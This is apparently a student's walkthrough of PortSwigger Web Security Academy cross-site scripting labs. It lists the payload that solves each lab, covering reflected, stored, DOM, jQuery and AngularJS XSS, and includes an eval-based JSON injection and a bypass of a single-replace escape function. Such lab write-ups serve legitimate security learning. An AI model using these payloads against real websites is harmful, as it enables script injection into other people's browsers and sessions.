# Labs
### Reflected XSS into HTML context with nothing encoded
```<script>alert(1)</script>``` in search box.

<br>

### Stored XSS into HTML context with nothing encoded
```<script>alert(1)</script>``` in comment section.

<br>

### DOM XSS in document.write sink using source location.search
<img width="500" src="https://user-images.githubusercontent.com/68285613/146972401-767cfebe-24de-403c-b447-e028a8b35f77.png">

``` "><svg onlond=alert(1)>``` in search box.

<br>

### DOM XSS in document.write sink using source location.search inside a select element

<img width="500" src="https://user-images.githubusercontent.com/68285613/146982039-d5264792-8f54-4e75-bd1e-4d18056a0ad6.png">

Once determined it's able to use url to write into script, 

use ```storeId="></select><img src=1 onerror=alert(1)>```.

<img width="500" src="https://user-images.githubusercontent.com/68285613/146986519-5c632667-cc06-49fb-90ac-ee63a4db6596.png">

<br>

### DOM XSS in innerHTML sink using source location.search
```</div><svg onload=alert(1)>``` in search box.

<br>

### DOM XSS in jQuery anchor href attribute sink using location.search source
Using herf alert.
```returnPath=javascript:alert('1')``` in link.

<br>

### DOM XSS in jQuery selector sink using a hashchange event
Readings:

[```What is "><img src=x onerror=prompt(1);>?```](https://www.quora.com/What-is-img-src-x-onerror-prompt-1)

```<iframe src="https://ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```

<br>

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
```{{$on.constructor('alert(1)')()}}``` in search box and press the button "Search".

<br>

## Reflected DOM XSS
### Readings
[Why my javascript alert() code is running before ```<h1>``` html tag?](https://stackoverflow.com/questions/53499153/why-my-javascript-alert-code-is-running-before-h1-html-tag)

Essential: Find the JavaScript file named "searchResult.js".

- searchResult.js:
    - ```eval('var searchResultsObj = ' + this.responseText);``` 

The following JSON is the key to solving this lab.
```
{
    "searchTerm":"INPUT", 
    "results":[]
} 
``` 


```INPUT``` is the text from search box.

**Enter ```\"-alert(1)}//``` in search box will solve this lab.**

<br>

### Explanation
By injecting ```\```, it will make the following input unescapable.

The first double-quotes following behind the slash is for closing searchTerm.

The ```-``` is for seperating alert() from others.

<img width="500" src="https://user-images.githubusercontent.com/68285613/147344228-a8a000ed-d39f-4894-bba3-dc846f22461d.png">

```alert(1)``` is for creating alert.

<img width="500" src="https://user-images.githubusercontent.com/68285613/147344233-d4574cb2-492a-45e3-854c-09148b517fc7.png">

```}``` is for closing JSON.

```//``` is preventing eacaping alert. 

<img width="500" src="https://user-images.githubusercontent.com/68285613/147344235-7f6b9b4a-afc1-49ff-9176-d8a6c4f6e377.png">

<br>

## Stored DOM XSS
Find a way to avoid the following funciton from the "loadCommentsWithVulnerableEscapeHtml.js" in comment section.

```    
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

### Attemps
Enter code in comment section.

1) ```<h1>test</h1>```

<img width="500" src="https://user-images.githubusercontent.com/68285613/147401353-929b5686-8262-4298-8d4f-785ac3c4b3b8.png">

```</h1>``` is missing, and ```<h1>a``` is not escaped.

2)  ```<img src=x onerror=alert(1)>```

<img width="500" src="https://user-images.githubusercontent.com/68285613/147401479-6850cc5e-3908-4403-9b72-dacf6179d1bb.png">

```<img src=x onerror=alert(1)>``` is escaped. 

3) ```\\<img src=x onerror=alert(1)>```

<img width="500" src="https://user-images.githubusercontent.com/68285613/147401780-ec59008a-a765-4d61-8fb3-053bbe39c5f4.png">

```\\<img src=x onerror=alert(1)>``` is escaped.

4) ```<><img src=x onerror=alert(1)>```

<img width="500" src="https://user-images.githubusercontent.com/68285613/147401902-03fe6416-6b3b-4ddb-98e5-e2395ce684a6.png">

```<><img src=x onerror=alert(1)>``` is generated.

So ```<><img src=x onerror=alert(1)>``` is the correct code. 
